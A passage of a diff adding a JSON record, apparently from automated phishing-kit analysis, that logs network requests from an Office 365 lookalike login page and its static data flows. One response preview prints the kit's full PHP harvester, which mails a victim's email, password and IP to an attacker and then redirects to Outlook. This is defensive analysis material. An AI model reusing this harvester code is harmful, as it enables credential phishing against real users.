+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 22854.268562,
+      "lastEventTs": 1777777228537,
+      "requestSentTs": 22854.268562,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "80455.42",
+      "sequence": 8,
+      "resourceType": "Image",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/4gxvxxtv1vaumat9ftkvh9ewyw-wh4ibokuvhgknx7q/0/bannerlogo?ts=635538653068704866",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 22854.280761,
+      "lastEventTs": 1777777228548,
+      "requestSentTs": 22854.280761,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "80455.43",
+      "sequence": 9,
+      "resourceType": "Other",
+      "initiatorType": "other",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4856.11/content/images/favicon_a.ico",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 22854.301052,
+      "lastEventTs": 1777777230564,
+      "requestSentTs": 22854.301052,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "80455.44",
+      "sequence": 10,
+      "resourceType": "XHR",
+      "initiatorType": "script",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+      "method": "POST",
+      "requestHeaders": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Content-Type",
+        "Referer",
+        "User-Agent"
+      ],
+      "requestContentType": "application/x-www-form-urlencoded",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": "username=dkgt%40tesq.com&passwd=S1mW286",
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "391",
+        "Content-Type": "text/html; charset=UTF-8",
+        "Date": "Sun, 03 May 2026 03:00:30 GMT",
+        "Keep-Alive": "timeout=5, max=74",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html; charset=UTF-8",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+      "responseBodyLength": 746,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 642,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 22856.706547,
+      "lastEventTs": 1777777231467,
+      "requestSentTs": 22856.706547,
+      "responseReceivedTs": 22856.709223,
+      "loadingFinishedTs": 22856.708705,
+      "latencyMs": 2.2,
+      "ttfbMs": 2.7,
+      "_timing_summary": {
+        "latencyMs": 2.2,
+        "ttfbMs": 2.7,
+        "protocol": "http/1.1",
+        "redirected": false,
+        "redirectChain": [],
+        "status": 200,
+        "hasCookieHeader": false,
+        "hasSetCookie": false
+      }
+    }
+  ],
+  "cdp_monitoring": {
+    "enabled": true,
+    "degraded": false,
+    "note": "ok"
+  },
+  "static_analysis": {
+    "function_count": 1,
+    "php_file_count": 1,
+    "data_flow_count": 3,
+    "data_flows": [
+      {
+        "form_source": "office/index.html",
+        "form_method": "post",
+        "form_fields": [
+          "username",
+          "passwd",
+          "persist"
+        ],
+        "action_target": "office.php",
+        "server_file": "office/office.php",
+        "server_receives": [
+          "eMailAdd",
+          "passwd",
+          "username"
+        ],
+        "server_actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$send",
+            "line": 17
+          },
+          {
+            "type": "redirect",
+            "target": "https://outlook.office.com",
+            "line": 20
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      },
+      {
+        "form_source": "office/index.html",
+        "form_method": "post",
+        "form_fields": [
+          "RelayState",
+          "SAMLRequest",
+          "canary_1"
+        ],
+        "action_target": "https://login.microsoftonline.com/common/login",
+        "server_file": null,
+        "server_receives": [],
+        "server_actions": [],
+        "exfil": []
+      },
+      {
+        "form_source": "office/index.html:<script#4>",
+        "form_method": "ajax",
+        "form_fields": [],
+        "action_target": "https://login.microsoftonline.com/common/login/telemetry",
+        "server_file": null,
+        "server_receives": [],
+        "server_actions": [],
+        "exfil": [],
+        "ajax_type": "jQuery.ajax({})",
+        "ajax_source_line": 27
+      }
+    ],
+    "php_files": {
+      "office/office.php": {
+        "receives_post": [
+          "eMailAdd",
+          "passwd",
+          "username"
+        ],
+        "actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$send",
+            "line": 17
+          },
+          {
+            "type": "redirect",
+            "target": "https://outlook.office.com",
+            "line": 20
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      }
+    }
+  }
+}
